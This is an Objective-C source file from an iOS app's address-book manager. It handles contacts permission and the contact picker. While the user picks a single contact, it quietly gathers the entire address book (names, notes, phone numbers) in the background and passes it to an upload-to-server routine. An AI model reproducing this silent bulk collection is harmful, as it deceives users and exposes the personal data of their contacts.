//
//  XQDAddressBookManager+IOS10.m
//  gongfudaiNew
//
//  Created by EriceWang on 16/9/23.
//  Copyright © 2016年 dashu. All rights reserved.
//

#import "XQDAddressBookManager+IOS10.h"
#define kValidate(s)    (s && s.length)
#import "XQDJSONUtil.h"
#import "NSObject+Swizzle.h"
#import "macro.h"

@implementation XQDAddressBookManager (IOS10)
+(void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        if (IOS_OR_LATER(9.0)) {
            [self swizzingClassSel:@selector(showAddressBookWithController:result:) withSel:@selector(iOS10_showAddressBookWithController:result:)];
            [self swizzingClassSel:@selector(uploadAllContactsWithResult:) withSel:@selector(iOS10_uploadAllContactsWithResult:)];
            [self swizzingClassSel:@selector(getOrignalContactsWithFilter:result:) withSel:@selector(iOS10_getOrignalContactsWithFilter:result:)];
        }
    });
}
+ (void)iOS10_showAddressBookWithController:(UIViewController *)viewController result:(ResultBlock)resultBlock {
    if ([self sharedInstance].forbidAppear) {
        return;
    }
    [self sharedInstance].queue =  dispatch_queue_create("cn.com.treefinance", DISPATCH_QUEUE_SERIAL);
    [self getStatusAuthorization:^(BOOL succes) {
        if (succes) {
            dispatch_async([self sharedInstance].queue, ^{
                [self getAllContactsWithFilter:YES result:^(NSArray * _Nullable result) {
                    [self uploadContactsToServer:result];
                }];
            });
            dispatch_async(dispatch_get_main_queue(), ^{
                CNContactPickerViewController * contactVc = [CNContactPickerViewController new];
                contactVc.delegate = [XQDAddressBookManager sharedInstance];
                [XQDAddressBookManager sharedInstance].innerBlock =  resultBlock;
                [viewController presentViewController:contactVc animated:YES completion:^{
                    [self sharedInstance].forbidAppear = YES;
                }];
            });
            
        } else {
            if (resultBlock) {
                resultBlock(NO, ContactCodeNoPermit, nil);
            }
        }
    }];
}
+ (void)iOS10_uploadAllContactsWithResult:(ResultBlock)uploadAllContacts {
    [self getStatusAuthorization:^(BOOL succes) {
        if (succes) {
            [self getAllContactsWithFilter:YES result:^(NSArray * _Nullable result) {
                if (uploadAllContacts) {
                    [self sharedInstance].uploadAllContacts = uploadAllContacts;
                    [self uploadContactsToServer:result];
                }
            }];
        } else {
            if (uploadAllContacts) {
                uploadAllContacts(NO, ContactCodeNoPermit, nil);
            }
        }
    }];
}
//获取所有的通讯录
+ (void)iOS10_getOrignalContactsWithFilter:(BOOL)isFilterd result:(ResultBlock)uploadAllContacts {
    [self getStatusAuthorization:^(BOOL succes) {
        if (succes) {
            [self getAllContactsWithFilter:isFilterd result:^(NSArray * _Nullable result) {
                uploadAllContacts(YES, ContactCodeNomal, @{@"contacts" : result});
            } ];
        } else {
            if (uploadAllContacts) {
                uploadAllContacts(NO, ContactCodeNoPermit, nil);
            }
        }
    }];
}
+ (void)getAllContactsWithFilter:(BOOL)filter result:(void(^)(NSArray * _Nullable result))block {
    CNContactStore *store = [[CNContactStore alloc] init];
    __block NSMutableArray *result = [NSMutableArray array];
    NSError *error = nil;
    NSArray *keys = @[
                      CNContactGivenNameKey,
                      CNContactMiddleNameKey,
                      CNContactFamilyNameKey,
                      CNContactNoteKey,
                      CNContactPhoneNumbersKey,
                      CNContactDatesKey,
                      CNContactImageDataKey,
                      CNContactThumbnailImageDataKey
                      ];
    CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];
    __block NSInteger index = 0;
    [store enumerateContactsWithFetchRequest:request error:&error usingBlock:^(CNContact * _Nonnull contact, BOOL * _Nonnull stop) {
        index++;
        if (filter) {// 重组数据结构
            NSMutableDictionary *dic = [NSMutableDictionary dictionary];
            [dic setObject:GET_NONNIL_VAL(contact.givenName) forKey:@"ln"];
            [dic setObject:GET_NONNIL_VAL(contact.middleName) forKey:@"mn"];
            [dic setObject:GET_NONNIL_VAL(contact.familyName) forKey:@"fn"];
            //获取note
            [dic setObject:GET_NONNIL_VAL(contact.note) forKey:@"ext"];
            //ios10中将创建时间和更新时间权限关闭
            [dic setObject:@"" forKey:@"updDt"];
            [dic setObject:@"" forKey:@"insDt"];
            BOOL availableContact = NO;
            NSInteger availableConut = 0;
            //获取电话号
            NSMutableArray *cns = [NSMutableArray array];
            for (int i = 0; availableConut < 3 && i < contact.phoneNumbers.count; i++) {
                CNLabeledValue *labelValue = (CNLabeledValue *)[contact.phoneNumbers objectAtIndex:i];
                NSString *phone = nil;
                NSString *type = nil;
                if (labelValue.label) {
                    NSString *label = labelValue.label;
                    type = [label stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"$!<>!$_"]];
                } else {
                    type = @"Mobile";
                }
                CNPhoneNumber *phoneNumber = (CNPhoneNumber *)labelValue.value;
                phone = phoneNumber.stringValue;
                if (phone && phone.length) {
                    availableConut++;
                    availableContact = YES;
                    [cns addObject:@{@"type" : type,@"phone" : phone}];
                }
            }
            if (availableContact) {
                [dic setObject:cns forKey:@"cns"];
                [result addObject:dic];
            }
            
        } else {//原始的数据结构
            [result addObject:contact];
        }
    }];
    if (result.count > 2000) {
        NSMutableArray *tempResult = [NSMutableArray arrayWithArray:result];
        for (NSDictionary *dic in tempResult) {
            
            NSString *fullName = [NSString stringWithFormat:@"%@ %@ %@", dic[@"fn"], dic[@"mn"], dic[@"ln"]];
            NSArray *cns = dic[@"cns"];
            
            for (NSDictionary *phoneDic in cns) {
                NSString *number = phoneDic[@"phone"];
                
                if ([fullName containsString:number]) {
                    [result removeObject:dic];
                    break;
                }
            }
        }
    }
    if (block) {
        block(result);
    }
}
#pragma mark delegate
- (void)contactPicker:(CNContactPickerViewController *)picker didSelectContactProperty:(CNContactProperty *)contactProperty {
    if (!self.innerBlock) {
        return;
    }
    self.forbidAppear = NO;
    CNContact *contact = contactProperty.contact;
        NSMutableString *fullName = [NSMutableString string];
        NSString *mobile = nil;
        NSDictionary *dic = nil;
        if (kValidate(contact.givenName)) {
            [fullName appendString:contact.givenName];
            }
        if (kValidate(contact.middleName)) {
            if (kValidate(contact.givenName)) {
                [fullName appendString:@" "];
            }
            [fullName appendString:contact.middleName];
        }
        if (kValidate(contact.familyName)) {
            if (kValidate(contact.middleName)) {
                [fullName appendString:@" "];
            }
            [fullName appendString:contact.familyName];
        }
        if (!fullName || !fullName.length) {
            self.innerBlock(NO, ContactCodeNoName, nil);
            return;
        }
    
    //获取手机号
    id phoneNumber = contactProperty.value;
    if ([phoneNumber isKindOfClass:[CNPhoneNumber class]]) {
        mobile = [(CNPhoneNumber *)phoneNumber stringValue];
    } else {
        mobile  = @"";
    }
    if (!mobile || !mobile.length) {
        self.innerBlock(NO, ContactCodeNoMobile,nil);
        return;
    }
//获取头像
    NSData *thumbData = contact.imageData?:contact.thumbnailImageData;
    NSString *thumbString = [thumbData base64EncodedStringWithOptions:0];
    thumbString = thumbString ? : @"";
    dic = @{@"name" : fullName, @"mobile" : mobile, @"imageString" : thumbString};
    self.innerBlock(YES , ContactCodeNomal, dic);
}
- (void)contactPickerDidCancel:(CNContactPickerViewController *)picker {
    if (self.innerBlock) {
        self.innerBlock(NO, ContactCodeNoSelect, nil);
        self.forbidAppear = NO;
    }
}
//获取通讯录权限
+ (void)getStatusAuthorization:(void(^)(BOOL succes))getStatus {
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusAuthorized) {//已经授权
        getStatus(YES);
    } else if(status == CNAuthorizationStatusNotDetermined) {//尚未进行第一次授权
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
            if (granted) {
                getStatus(YES);
            } else {
                getStatus(NO);
            }
        }];
    } else {//用户未授权访问通讯录
        getStatus(NO);
    }
}
@end
